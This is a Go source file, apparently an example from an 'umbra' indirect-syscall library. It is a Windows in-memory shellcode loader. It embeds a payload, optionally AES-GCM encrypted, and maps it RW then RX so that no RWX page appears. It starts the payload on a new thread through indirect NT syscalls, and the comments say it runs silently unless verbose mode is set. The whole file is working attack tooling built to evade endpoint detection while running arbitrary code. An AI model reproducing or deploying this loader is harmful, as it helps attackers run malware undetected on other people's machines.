//go:build windows && amd64

// Command inject is an in-memory shellcode loader built on the umbra engine.
//
// The payload is embedded at build time, optionally AES-256-GCM encrypted, and
// mapped with a read/write -> execute/read transition so no RWX page is ever
// created. It is then executed on a fresh thread created via NtCreateThreadEx;
// every NT call goes through an indirect syscall.
//
// Replace examples/inject/payload.hex with the hex of your payload. If it starts
// with the "MLTN" magic the loader decrypts it with the key in payload_key.go,
// otherwise the content is treated as plain hex. Run with -v to see each stage
// on stderr; without -v the loader is silent.
package main

import (
	"crypto/aes"
	"crypto/cipher"
	_ "embed"
	"encoding/hex"
	"flag"
	"fmt"
	"os"
	"strings"
	"unsafe"

	"github.com/nullbyter19/umbra"
)

//go:embed payload.hex
var payloadEmbed string

const (
	memCommit       = 0x1000
	memReserve      = 0x2000
	pageReadWrite   = 0x04
	pageExecuteRead = 0x20
	curProcess      = ^uintptr(0)
	threadAllAccess = 0x1FFFFF
)

var verbose bool

func log(format string, a ...any) {
	if verbose {
		fmt.Fprintf(os.Stderr, format+"\n", a...)
	}
}

func main() {
	flag.BoolVar(&verbose, "v", false, "verbose: report each loader stage on stderr")
	flag.Parse()

	sc, err := loadPayload()
	if err != nil {
		os.Exit(1)
	}
	if len(sc) == 0 {
		os.Exit(1)
	}
	log("[*] payload: %d bytes", len(sc))

	e, err := umbra.New()
	if err != nil {
		log("[-] init: %v", err)
		os.Exit(1)
	}
	log("[+] ntdll resolved: %d services", e.Count())

	// 1) reserve + commit RW memory for the payload.
	var base uintptr
	size := uintptr(len(sc))
	if _, err := e.Syscall(umbra.HashAllocVM, curProcess,
		uintptr(unsafe.Pointer(&base)), 0,
		uintptr(unsafe.Pointer(&size)), memCommit|memReserve, pageReadWrite); err != nil {
		log("[-] allocate: %v", err)
		os.Exit(1)
	}
	log("[+] allocated RW at 0x%x (%d bytes)", base, size)

	// 2) copy the payload into the allocation.
	var written uintptr
	if _, err := e.Syscall(umbra.HashWriteVM, curProcess, base,
		uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)),
		uintptr(unsafe.Pointer(&written))); err != nil {
		log("[-] write: %v", err)
		os.Exit(1)
	}
	log("[+] wrote %d bytes", written)

	// 3) flip the page to RX -- never RWX.
	rgn := uintptr(len(sc))
	var old uintptr
	if _, err := e.Syscall(umbra.HashProtectVM, curProcess,
		uintptr(unsafe.Pointer(&base)), uintptr(unsafe.Pointer(&rgn)),
		uintptr(pageExecuteRead), uintptr(unsafe.Pointer(&old))); err != nil {
		log("[-] protect: %v", err)
		os.Exit(1)
	}
	log("[+] reprotected RX (was 0x%x)", old)

	// 4) start the payload on a new thread.
	var thread uintptr
	if _, err := e.Syscall(umbra.HashCreateThread,
		uintptr(unsafe.Pointer(&thread)), uintptr(threadAllAccess), 0,
		curProcess, base, 0, 0, 0, 0, 0, 0); err != nil {
		log("[-] create thread: %v", err)
		os.Exit(1)
	}
	log("[+] thread started (handle 0x%x)", thread)

	// 5) keep the process alive while the payload runs (NULL timeout = infinite).
	e.Syscall(umbra.HashWaitForObject, thread, 0, 0)
	log("[*] payload thread finished")
}

// loadPayload decodes the embedded payload, decrypting the MLTN container when
// present. Errors are written to stderr.
func loadPayload() ([]byte, error) {
	raw, err := hex.DecodeString(strings.TrimSpace(payloadEmbed))
	if err != nil {
		log("[-] payload.hex is not valid hex: %v", err)
		return nil, err
	}
	if len(raw) < 4 || string(raw[:4]) != "MLTN" {
		return raw, nil
	}
	key, err := hex.DecodeString(strings.TrimSpace(payloadKeyHex))
	if err != nil || len(key) != 32 {
		log("[-] MLTN payload requires a 32-byte hex key in payload_key.go")
		return nil, fmt.Errorf("bad key")
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	if len(raw) < 4+gcm.NonceSize() {
		log("[-] MLTN container truncated")
		return nil, fmt.Errorf("truncated")
	}
	nonce := raw[4 : 4+gcm.NonceSize()]
	ct := raw[4+gcm.NonceSize():]
	pt, err := gcm.Open(nil, nonce, ct, nil)
	if err != nil {
		log("[-] payload decryption failed")
		return nil, err
	}
	log("[+] payload decrypted")
	return pt, nil
}
